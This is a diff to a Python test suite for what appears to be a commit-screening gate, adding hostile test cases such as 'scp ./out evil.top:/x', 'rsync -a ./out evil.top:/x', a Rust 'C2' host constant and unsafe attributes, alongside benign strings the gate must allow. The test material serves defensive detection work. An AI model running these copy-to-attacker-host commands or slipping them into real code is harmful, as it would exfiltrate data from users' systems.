@@ -121,6 +121,10 @@ def hostile_cases() -> list[tuple[str, str, bridge.Case, str]]:
     add("at-file-tld", "network-literal", added(base, "git@evil.zip:me/repo"), "network-literal")
     add("curl-file-tld", "network-literal", added(base, "curl evil.sh"), "network-literal")
     add("ssh-port-flag", "network-literal", added(base, "ssh -p 22 evil.top"), "network-literal")
+    add("port-unlisted-tld", "network-literal", added(base, "peer = exfil.tv:443"), "network-literal")
+    add("scp-destination", "network-literal", added(base, "scp ./out evil.top:/x"), "network-literal")
+    add("rsync-destination", "network-literal", added(base, "rsync -a ./out evil.top:/x"), "network-literal")
+    add("file-tld-wellknown-port", "network-literal", added(base, 'const C2: &str = "c2.rs:443";'), "network-literal")
     add("wget-file-tld", "network-literal", added(base, "wget evil.py"), "network-literal")
     add("git-url", "network-literal", added(base, "git://host/repo"), "network-literal")
     add("ipv6", "network-literal", added(base, "2001:4860:4860::8888"), "network-literal")
@@ -128,6 +132,7 @@ def hostile_cases() -> list[tuple[str, str, bridge.Case, str]]:
     add("unsafe-fn", "unsafe", added(base, "pub unsafe fn read(ptr: *const u8) -> u8 {"), "unsafe")
     add("unsafe-brace-next-line", "unsafe", added(base, "    unsafe"), "unsafe")
     add("unsafe-attribute", "unsafe", added(base, '#[unsafe(link_section = ".init_array")]'), "unsafe")
+    add("unsafe-cfg-attr", "unsafe", added(base, '#[cfg_attr(feature = "x", unsafe(no_mangle))]'), "unsafe")
     add("proc-macro", "build", added(base, "proc-macro = true", "crates/probe/Cargo.toml"), "build")
     add("dependency-section", "build", added(base, "[dependencies]", "Cargo.toml"), "build")
     add("dependency", "dependencies", added(base, "serde = \"1\"", "Cargo.toml"), "dependencies")
@@ -160,7 +165,7 @@ FIXTURE_ENV = dict(os.environ, GIT_AUTHOR_NAME="Fixture", GIT_AUTHOR_EMAIL="fixt
 
 
 def git_in(repo: pathlib.Path, *args: str) -> bytes:
-    return subprocess.run(["git", "-C", str(repo), *args], env=FIXTURE_ENV, check=True, capture_output=True).stdout
+    return bridge.git(["-C", str(repo), *args], env=FIXTURE_ENV).stdout
 
 
 def stage(repo: pathlib.Path, files: dict[str, bytes]) -> None:
@@ -303,8 +308,10 @@ def check_signed_object() -> None:
 def check_ordinary_text_is_allowed() -> None:
     base = valid_case()
     for text in ("let n = x.len();", "self.changes.push(line.path)", "see Cargo.toml and README.md", "mod args.rs;", "// the raw call is unsafe because it aliases", "#![forbid(unsafe_code)]", "self.app.run();", "self.io.flush()", "the infra repository", "cd ~/.yi", 'open("Cargo.toml")', "let id = row.id;", "server: host.ru", "@functools.cache", 'trace::span("console.draw")', '"response.failed"', "set `mcp.enabled` and `config.intake.enabled`", "see bridge.py:884 and args.rs:300", "`prompts-list`, `ping`. It speaks JSON-RPC itself, `mcp.enabled` gates", "see curl docs at src/app.rs", "// ping the runner; see scripts/hooks/commit.py", "let nc = self.pool.len();",
-                 # Documented ceiling: a ported host on rs, md, py or sh reads as the file reference main.rs:42.
-                 "host = exfil.sh:443", "    @pytest.mark.parametrize(\"n\", [1])"):
+                 "wire.go:58 and grep_files.zig:344 and pipe_test.go:17-68", "src/main.rs:80", "scp report.txt host:/tmp",
+                 "/// Copying is unsafe (the pointer may dangle)", "0 non-comment unsafe (the single",
+                 # Documented ceiling: a ported host on a file-extension TLD counts only on a well-known port.
+                 "host = exfil.sh:4444", "    @pytest.mark.parametrize(\"n\", [1])"):
         assert bridge.evaluate(added(base, text)) == bridge.ALLOW, text
 
 
